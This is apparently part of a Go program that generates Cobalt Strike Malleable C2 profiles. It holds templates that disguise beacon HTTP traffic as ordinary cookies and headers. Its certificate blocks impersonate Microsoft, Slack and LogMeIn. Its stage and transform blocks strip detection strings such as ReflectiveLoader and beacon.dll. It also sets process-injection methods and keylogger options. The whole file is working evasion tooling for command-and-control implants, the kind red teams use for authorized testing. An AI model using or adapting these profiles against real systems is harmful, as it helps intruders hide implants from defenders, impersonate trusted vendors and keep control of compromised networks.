	set trust_x_forwarded_for "{{.Variables.forward}}";			
}
http-get {

{{.Variables.HTTP_GET_URI}}


client {
	header "Host" "{{.Variables.Host}}";
	{{.Variables.CDN}}

	metadata {
		mask;
		{{.Variables.metadata_mode}};
		uri-append;
	}
}

server {
	header "X-Content-Type-Options" "nosniff";
	header "X-XSS-Protection" "1; mode=block";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Cache-Control" "public,max-age={{.Variables.maxage}}";
	header "Age" "{{.Variables.Age}}";
	header "Alternate-Protocol" "80:quic";

	output {
		print;
	}
}
}

http-post {

{{.Variables.HTTP_POST_URI}}

client {
	header "Host" "{{.Variables.Host}}";
	{{.Variables.CDN}}

	id {
		mask;
		{{.Variables.metadata_mode}};
		uri-append;
	}

	output {
		print;
	}
}

server {
	header "X-Content-Type-Options" "nosniff";
	header "X-XSS-Protection" "1; mode=block";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Cache-Control" "public,max-age={{.Variables.maxage}}";
	header "Age" "{{.Variables.Age}}";
	header "Alternate-Protocol" "80:quic";
	output {
		print;
	}
}
}
`, `
http-config {

	#set "true" if teamserver is behind redirector
	set trust_x_forwarded_for "{{.Variables.forward}}";			
}
http-get {

{{.Variables.HTTP_GET_URI}}


client {
	header "Host" "{{.Variables.Host}}";
	header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8";
	header "Accept-Language" "en-US,en;q=0.5";

	metadata {
		{{.Variables.metadata_mode}};
		prepend "PREF=ID={{.Variables.CSMValue}}";
		header "Cookie";
	}
}

server {
	header "X-Content-Type-Options" "nosniff";
	header "Content-Encoding" "gzip";
	header "X-XSS-Protection" "1; mode=block";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Cache-Control" "public,max-age={{.Variables.maxage}}";
	header "Age" "{{.Variables.Age}}";
	header "Alternate-Protocol" "80:quic";

	output {
		print;
	}
}
}

http-post {

{{.Variables.HTTP_POST_URI}}

client {
	header "Host" "{{.Variables.Host}}";
	header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8";
	header "Accept-Language" "en-US,en;q=0.5";

	id {
		{{.Variables.metadata_mode}};
		prepend "U={{.Variables.UValue}}";
		prepend "PREF=ID=";
		header "Cookie";
	}

	output {
		print;
	}
}

server {
	header "X-Content-Type-Options" "nosniff";
	header "Content-Encoding" "gzip";
	header "X-XSS-Protection" "1; mode=block";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Cache-Control" "public,max-age={{.Variables.maxage}}";
	header "Age" "{{.Variables.Age}}";
	header "Alternate-Protocol" "80:quic";
	output {
		print;
	}
}
}`,
	`
http-config {

	#set "true" if teamserver is behind redirector
	set trust_x_forwarded_for "{{.Variables.forward}}";			
}

http-get {


    {{.Variables.HTTP_GET_URI}}

    client {

        header "Accept" "*/*";

        metadata {
            {{.Variables.metadata_mode}};;
            prepend "session-token=";
            append "csm-hit={{.Variables.CSMValue}}";
            header "Cookie";
        }
    }
    server {
        output {
                print;
        }
}
}

http-post {

    {{.Variables.HTTP_POST_URI}}

    client {

        header "Accept" "*/*";
        header "Content-Type" "text/xml";
        header "X-Requested-With" "XMLHttpRequest";

        id {
                {{.Variables.metadata_mode}};;
                prepend "U={{.Variables.UValue}}";
                prepend "REF=ID=";
                header "Cookie";
        }

        output {
                print;
        }
}

    server {

        header "Server" "Server";
        header "X-Frame-Options" "SAMEORIGIN";
        header "x-ua-compatible" "IE=edge";

        output {
            print;
        }
    }
}
`,
}

var Cert = []string{`
set O        "Microsoft Corporation"; #Organization Name
set C        "US"; #Country
set L        "Redmond"; #Locality
set OU       "Microsoft IT"; #Organizational Unit Name
set ST       "WA"; #State or Province
set validity "365"; #Number of days the cert is valid for
}
`, `
set O        "Slack Technologies Inc"; #Organization Name
set C        "US"; #Country
set L        "San Francisco"; #Locality
set OU       "DigiCert Inc"; #Organizational Unit Name
set ST       "CA"; #State or Province
set validity "365"; #Number of days the cert is valid for
}`, `
set O        "LogMeIn Inc."; #Organization Name
set C        "US"; #Country
set L        "Boston"; #Locality
set OU       "DigiCert Inc"; #Organizational Unit Name
set ST       "Massachusetts"; #State or Province
set validity "365"; #Number of days the cert is valid for
}`, `
set O        "Microsoft Corporation"; #Organization Name
set C        "US"; #Country
set L        "Redmond"; #Locality
set OU       "DigiCert Inc"; #Organizational Unit Name
set ST       "Washington"; #State or Province
set validity "365"; #Number of days the cert is valid for
}`, `
https-certificate {
set keystore "{{.Variables.CertName}}";
set password "{{.Variables.Password}}";
}
`}

func Beacon_Com_Struct() string {
	return `
set host_stage "{{.Variables.stage}}";
set sleeptime "{{.Variables.sleep}}";
set jitter    "{{.Variables.jitter}}";
set useragent "{{.Variables.useragent}}";

http-beacon {
    set library "{{.Variables.httplib}}";
}


# Task and Proxy Max Size
set tasks_max_size "{{.Variables.tasks_max_size}}";
set tasks_proxy_max_size "{{.Variables.tasks_proxy_max_size}}";
set tasks_dns_proxy_max_size "{{.Variables.tasks_dns_proxy_max_size}}";

set data_jitter "{{.Variables.datajitter}}";
set smb_frame_header "";
set pipename "{{.Variables.pipename}}";
set pipename_stager "{{.Variables.pipename_stager}}";

set tcp_frame_header "";
set ssh_banner "{{.Variables.SSH_Banner}}";
set ssh_pipename "{{.Variables.SSH_pipename}}##";

####Manaully add these if your doing C2 over DNS (Future Release)####
##dns-beacon {
#    set dns_idle             "1.2.3.4";
#    set dns_max_txt          "199";
#    set dns_sleep            "1";
#    set dns_ttl              "5";
#    set maxdns               "200";
#    set dns_stager_prepend   "doc-stg-prepend";
#    set dns_stager_subhost   "doc-stg-sh.";

#    set beacon               "doc.bc.";
#    set get_A                "doc.1a.";
#    set get_AAAA             "doc.4a.";
#    set get_TXT              "doc.tx.";
#    set put_metadata         "doc.md.";
#    set put_output           "doc.po.";
#    set ns_response          "zero";

#}

`
}
func Beacon_Stage_Struct_p1() string {
	return `

stage {
	set obfuscate "true";
	set stomppe "true";
	set cleanup "true";
	set userwx "false";
	set smartinject "true";

	set syscall_method "{{.Variables.syscall_method}}"; #### needs a varible
	###will change down the road but 32-bit shouldn't be used that much
	set magic_mz_x86 "MZRE";
	set magic_mz_x64 "{{.Variables.magic_mz_x64}}";
	set magic_pe "{{.Variables.magic_pe}}";

	#TCP and SMB beacons will obfuscate themselves while they wait for a new connection.
	#They will also obfuscate themselves while they wait to read information from their parent Beacon.
	set sleep_mask "true";
	`
}
func Beacon_Stage_p2_Stuct() string {
	return `
	{{.Variables.pe}}
	`
}
func Beacon_GETPOST_Profile_Struct() string {
	return `
	{{.Variables.Profile}}
`
}

func Beacon_SSL_Struct() string {
	return `
	{{.Variables.Cert}}
	`
}

func Beacon_Stage_Struct_p3() string {
	return `
	
	transform-x86 {
		prepend "\x90\x90\x90"; # NOP, NOP!
		strrep "ReflectiveLoader" "";
		strrep "This program cannot be run in DOS mode" "";
		strrep "NtQueueApcThread" "";
		strrep "Stack memory was corrupted" "";
		strrep "beacon.dll" "";
		strrep "ADVAPI32.dll" "";
		strrep "WININET.dll" "";
		strrep "WS2_32.dll" "";
		strrep "DNSAPI.dll" "";
		strrep "Secur32.dll" "";
		strrep "VirtualProtectEx" "";
		strrep "VirtualProtect" "";
		strrep "VirtualAllocEx" "";
		strrep "VirtualAlloc" "";
		strrep "VirtualFree" "";
		strrep "VirtualQuery" "";
		strrep "RtlVirtualUnwind" "";
		strrep "sAlloc" "";
		strrep "FlsFree" "";
		strrep "FlsGetValue" "";
		strrep "FlsSetValue" "";
		strrep "InitializeCriticalSectionEx" "";
		strrep "CreateSemaphoreExW" "";
		strrep "SetThreadStackGuarantee" "";
		strrep "CreateThreadpoolTimer" "";
		strrep "SetThreadpoolTimer" "";
		strrep "WaitForThreadpoolTimerCallbacks" "";
		strrep "CloseThreadpoolTimer" "";
		strrep "CreateThreadpoolWait" "";
		strrep "SetThreadpoolWait" "";
		strrep "CloseThreadpoolWait" "";
		strrep "FlushProcessWriteBuffers" "";
		strrep "FreeLibraryWhenCallbackReturns" "";
		strrep "GetCurrentProcessorNumber" "";
		strrep "GetLogicalProcessorInformation" "";
		strrep "CreateSymbolicLinkW" "";
		strrep "SetDefaultDllDirectories" "";
		strrep "EnumSystemLocalesEx" "";
		strrep "CompareStringEx" "";
		strrep "GetDateFormatEx" "";
		strrep "GetLocaleInfoEx" "";
		strrep "GetTimeFormatEx" "";
		strrep "GetUserDefaultLocaleName" "";
		strrep "IsValidLocaleName" "";
		strrep "LCMapStringEx" "";
		strrep "GetCurrentPackageId" "";
		strrep "UNICODE" "";
		strrep "UTF-8" "";
		strrep "UTF-16LE" "";
		strrep "MessageBoxW" "";
		strrep "GetActiveWindow" "";
		strrep "GetLastActivePopup" "";
		strrep "GetUserObjectInformationW" "";
		strrep "GetProcessWindowStation" "";
		strrep "Sunday" "";
		strrep "Monday" "";
		strrep "Tuesday" "";
		strrep "Wednesday" "";
		strrep "Thursday" "";
		strrep "Friday" "";
		strrep "Saturday" "";
		strrep "January" "";
		strrep "February" "";
		strrep "March" "";
		strrep "April" "";
		strrep "June" "";
		strrep "July" "";
		strrep "August" "";
		strrep "September" "";
		strrep "October" "";
		strrep "November" "";
		strrep "December" "";
		strrep "MM/dd/yy" "";
		strrep "Stack memory around _alloca was corrupted" "";
		strrep "Unknown Runtime Check Error" "";
		strrep "Unknown Filename" "";
		strrep "Unknown Module Name" "";
		strrep "Run-Time Check Failure #%d - %s" "";
		strrep "Stack corrupted near unknown variable" "";
		strrep "Stack pointer corruption" "";
		strrep "Cast to smaller type causing loss of data" "";
		strrep "Stack memory corruption" "";
		strrep "Local variable used before initialization" "";
		strrep "Stack around _alloca corrupted" "";
		strrep "RegOpenKeyExW" "";
		strrep "egQueryValueExW" "";
		strrep "RegCloseKey" "";
		strrep "LibTomMath" "";
		strrep "Wow64DisableWow64FsRedirection" "";
		strrep "Wow64RevertWow64FsRedirection" "";
		strrep "Kerberos" "";
		strrep "msvcrt.dll" "";
		strrep "C:\\Windows\\System32\\msvcrt.dll" "";
		strrep "Stack around the variable" "";
		strrep "' was corrupted." "" ;
		strrep "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared with a different calling convention." "";

		}

	transform-x64 {
		prepend "\x90\x90\x90"; # NOP, NOP!
		strrep "ReflectiveLoader" "";
		strrep "This program cannot be run in DOS mode" "";
		strrep "beacon.x64.dll" "";
		strrep "NtQueueApcThread" "";
		strrep "Stack memory was corrupted" "";
		strrep "beacon.dll" "";
		strrep "ADVAPI32.dll" "";
		strrep "WININET.dll" "";
		strrep "WS2_32.dll" "";
		strrep "DNSAPI.dll" "";
		strrep "Secur32.dll" "";
		strrep "VirtualProtectEx" "";
		strrep "VirtualProtect" "";
		strrep "VirtualAllocEx" "";
		strrep "VirtualAlloc" "";
		strrep "VirtualFree" "";
		strrep "VirtualQuery" "";
		strrep "RtlVirtualUnwind" "";
		strrep "sAlloc" "";
		strrep "FlsFree" "";
		strrep "FlsGetValue" "";
		strrep "FlsSetValue" "";
		strrep "InitializeCriticalSectionEx" "";
		strrep "CreateSemaphoreExW" "";
		strrep "SetThreadStackGuarantee" "";
		strrep "CreateThreadpoolTimer" "";
		strrep "SetThreadpoolTimer" "";
		strrep "WaitForThreadpoolTimerCallbacks" "";
		strrep "CloseThreadpoolTimer" "";
		strrep "CreateThreadpoolWait" "";
		strrep "SetThreadpoolWait" "";
		strrep "FreeLibraryWhenCallbackReturns" "";
		strrep "GetCurrentProcessorNumber" "";
		strrep "GetLogicalProcessorInformation" "";
		strrep "CreateSymbolicLinkW" "";
		strrep "SetDefaultDllDirectories" "";
		strrep "EnumSystemLocalesEx" "";
		strrep "CompareStringEx" "";
		strrep "GetDateFormatEx" "";
		strrep "GetLocaleInfoEx" "";
		strrep "GetTimeFormatEx" "";
		strrep "GetUserDefaultLocaleName" "";
		strrep "IsValidLocaleName" "";
		strrep "LCMapStringEx" "";
		strrep "GetCurrentPackageId" "";
		strrep "UNICODE" "";
		strrep "UTF-8" "";
		strrep "UTF-16LE" "";
		strrep "MessageBoxW" "";
		strrep "GetActiveWindow" "";
		strrep "GetLastActivePopup" "";
		strrep "GetUserObjectInformationW" "";
		strrep "GetProcessWindowStation" "";
		strrep "Sunday" "";
		strrep "Monday" "";
		strrep "Tuesday" "";
		strrep "Wednesday" "";
		strrep "Thursday" "";
		strrep "Friday" "";
		strrep "Saturday" "";
		strrep "January" "";
		strrep "February" "";
		strrep "March" "";
		strrep "April" "";
		strrep "June" "";
		strrep "July" "";
		strrep "August" "";
		strrep "September" "";
		strrep "October" "";
		strrep "November" "";
		strrep "December" "";
		strrep "MM/dd/yy" "";
		strrep "Stack memory around _alloca was corrupted" "";
		strrep "Unknown Runtime Check Error" "";
		strrep "Unknown Filename" "";
		strrep "Unknown Module Name" "";
		strrep "Run-Time Check Failure #%d - %s" "";
		strrep "Stack corrupted near unknown variable" "";
		strrep "Stack pointer corruption" "";
		strrep "Cast to smaller type causing loss of data" "";
		strrep "Stack memory corruption" "";
		strrep "Local variable used before initialization" "";
		strrep "Stack around _alloca corrupted" "";
		strrep "RegOpenKeyExW" "";
		strrep "egQueryValueExW" "";
		strrep "RegCloseKey" "";
		strrep "LibTomMath" "";
		strrep "Wow64DisableWow64FsRedirection" "";
		strrep "Wow64RevertWow64FsRedirection" "";
		strrep "Kerberos" "";
		strrep "msvcrt.dll" "";
		strrep "C:\\Windows\\System32\\msvcrt.dll" "";
		strrep "Stack around the variable" "";
		strrep "' was corrupted." "" ;
		strrep "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared with a different calling convention." "";

		}
}
`
}
func Process_Inject_Struct() string {
	return `

process-inject {
    # set remote memory allocation technique
	set allocator "{{.Variables.injector}}";

    # shape the content and properties of what we will inject
    set min_alloc "{{.Variables.processinject_min_alloc}}";
    set userwx    "false";
    set startrwx "true";
	
    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    # specify how we execute code in the remote process
    execute {
		CreateThread "ntdll.dll!RtlUserThreadStart+0x{{.Variables.ThreadStartNum}}";
        NtQueueApcThread-s;
        SetThreadContext;
        CreateRemoteThread;
		CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
        RtlCreateUserThread;
	}
}
`
}
func Beacon_PostEX_Struct() string {
	return `
post-ex {
    # control the temporary process we spawn to
	{{.Variables.Post_EX_Process_Name}}

    # change the permissions and content of our post-ex DLLs
    set obfuscate "true";

	# Allows multi-threaded post-ex DLLs to spawn threads with a spoofed start address
	{{.Variables.thread_hint}}

    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";
 
    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "false";
	# do not enable this unless needed. Disabling AMSI is an IOC
	
	# control the method used to log keystrokes 
	set keylogger "{{.Variables.Keylogger}}";

	# cleanup the post-ex UDRL memory when the post-ex DLL is loaded 
	set cleanup "true";
}
`
}
